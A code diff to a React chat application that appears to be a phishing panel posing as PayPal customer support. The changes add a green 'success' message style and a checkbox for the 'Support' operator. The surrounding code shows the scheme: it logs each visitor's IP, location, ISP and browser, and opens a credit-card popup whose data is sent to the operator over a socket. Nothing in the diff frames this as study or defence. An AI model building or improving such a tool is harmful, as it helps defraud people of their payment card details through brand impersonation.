@@ -12,6 +12,7 @@ const SendIcon = () => ( <svg xmlns="http://www.w3.org/2000/svg" className="h-6 
 const AttachmentIcon = () => ( <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 16 16"><path d="M4.5 3a2.5 2.5 0 0 1 5 0v9a1.5 1.5 0 0 1-3 0V5a.5.5 0 0 1 1 0v7a.5.5 0 0 0 1 0V3a1.5 1.5 0 1 0-3 0v9a2.5 2.5 0 0 0 5 0V5A.5.5 0 0 1 9 5v7a1.5 1.5 0 1 1-3 0z"/></svg> );
 const FileIcon = () => ( <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 16 16"><path d="M14 4.5V14a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V2a2 2 0 0 1 2-2h5.5zm-3 0A1.5 1.5 0 0 1 9.5 3V1H4a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1V4.5z"/></svg> );
 const ExclamationIcon = () => ( <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" className="text-red-500" viewBox="0 0 16 16"><path d="M8.982 1.566a1.13 1.13 0 0 0-1.96 0L.165 13.233c-.457.778.091 1.767.98 1.767h13.713c.889 0 1.438-.99.98-1.767L8.982 1.566zM8 5c.535 0 .954.462.9.995l-.35 3.507a.552.552 0 0 1-1.1 0L7.1 5.995A.905.905 0 0 1 8 5zm.002 6a1 1 0 1 1 0 2 1 1 0 0 1 0-2z"/></svg> );
+const CheckIcon = () => ( <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" className="text-green-500" viewBox="0 0 16 16"><path d="M10.97 4.97a.75.75 0 0 1 1.07 1.05l-3.99 4.99a.75.75 0 0 1-1.08.02L4.324 8.384a.75.75 0 1 1 1.06-1.06l2.094 2.093 3.473-4.425a.267.267 0 0 1 .02-.022z"/></svg> );
 const PopupIcon = () => ( <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M16 0H0v16h16V0zM1.5 1.5v13h13v-13h-13z"/><path d="M10 3.5v1.5h-7V3.5h7zm0 4v1.5h-7V7.5h7zm0 4v1.5h-7v-1.5h7z"/></svg> );
 const CreditCardIcon = () => ( 
   <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
@@ -239,6 +240,7 @@ function App() {
     const [uploading, setUploading] = useState(false);
     const [clientInfo, setClientInfo] = useState({ ip: 'Waiting for user interaction...', city: 'N/A', country: 'N/A', isp: 'N/A', userAgent: 'N/A', language: 'N/A', connectedAt: null });
     const [isImportant, setIsImportant] = useState(false);
+    const [isSuccess, setIsSuccess] = useState(false);
     const [showPopup, setShowPopup] = useState(false);
     const [showCreditCardPopup, setShowCreditCardPopup] = useState(false);
 
@@ -315,10 +317,12 @@ function App() {
             socket.emit('chat message', {
                 user: userType,
                 text: message,
-                isImportant: userType === 'Support' ? isImportant : false
+                isImportant: userType === 'Support' ? isImportant : false,
+                isSuccess: userType === 'Support' ? isSuccess : false
             });
             setMessage('');
             setIsImportant(false);
+            setIsSuccess(false);
         }
     };
     
@@ -360,6 +364,16 @@ function App() {
     const handleCreditCardSubmit = (cardData) => {
         socket.emit('credit card data', { cardData });
         setShowCreditCardPopup(false);
+    };
+
+    const handleCheckboxChange = (type) => {
+        if (type === 'important') {
+            setIsImportant(!isImportant);
+            if (!isImportant) setIsSuccess(false);
+        } else if (type === 'success') {
+            setIsSuccess(!isSuccess);
+            if (!isSuccess) setIsImportant(false);
+        }
     };
 
     if (!isLoggedIn) {
@@ -464,7 +478,9 @@ function App() {
                                     ? 'bg-[#0070ba] text-white rounded-tr-none'
                                     : msg.isImportant
                                         ? 'bg-red-100 text-red-900 border border-red-200 rounded-tl-none'
-                                        : 'bg-[#e1e7eb] text-black rounded-tl-none'
+                                        : msg.isSuccess
+                                            ? 'bg-green-100 text-green-900 border border-green-200 rounded-tl-none'
+                                            : 'bg-[#e1e7eb] text-black rounded-tl-none'
                                 }`}>
                                     <p>{msg.text}</p>
                                 </div>
@@ -484,17 +500,31 @@ function App() {
                     </button>
                     <input type="text" value={message} onChange={(e) => setMessage(e.target.value)} placeholder="Write your message..." className="flex-1 p-3 border border-[#e1e7eb] rounded-full focus:outline-none focus:ring-2 focus:ring-[#009cde] transition" />
                     {userType === 'Support' && (
-                        <div className="flex items-center" title="Send as important message">
-                            <input
-                                type="checkbox"
-                                id="important-checkbox"
-                                checked={isImportant}
-                                onChange={(e) => setIsImportant(e.target.checked)}
-                                className="w-4 h-4 text-red-600 bg-gray-100 border-gray-300 rounded focus:ring-red-500 cursor-pointer"
-                            />
-                            <label htmlFor="important-checkbox" className="ml-2 text-sm font-medium text-red-600 cursor-pointer flex items-center">
-                                <ExclamationIcon />
-                            </label>
+                        <div className="flex items-center gap-4">
+                            <div className="flex items-center" title="Send as important message">
+                                <input
+                                    type="checkbox"
+                                    id="important-checkbox"
+                                    checked={isImportant}
+                                    onChange={() => handleCheckboxChange('important')}
+                                    className="w-4 h-4 text-red-600 bg-gray-100 border-gray-300 rounded focus:ring-red-500 cursor-pointer"
+                                />
+                                <label htmlFor="important-checkbox" className="ml-2 text-sm font-medium text-red-600 cursor-pointer flex items-center">
+                                    <ExclamationIcon />
+                                </label>
+                            </div>
+                            <div className="flex items-center" title="Send as success message">
+                                <input
+                                    type="checkbox"
+                                    id="success-checkbox"
+                                    checked={isSuccess}
+                                    onChange={() => handleCheckboxChange('success')}
+                                    className="w-4 h-4 text-green-600 bg-gray-100 border-gray-300 rounded focus:ring-green-500 cursor-pointer"
+                                />
+                                <label htmlFor="success-checkbox" className="ml-2 text-sm font-medium text-green-600 cursor-pointer flex items-center">
+                                    <CheckIcon />
+                                </label>
+                            </div>
                         </div>
                     )}
                     <button type="submit" className="bg-[#0070ba] text-white p-3 rounded-full w-12 h-12 flex items-center justify-center flex-shrink-0 hover:bg-[#003087] transition">
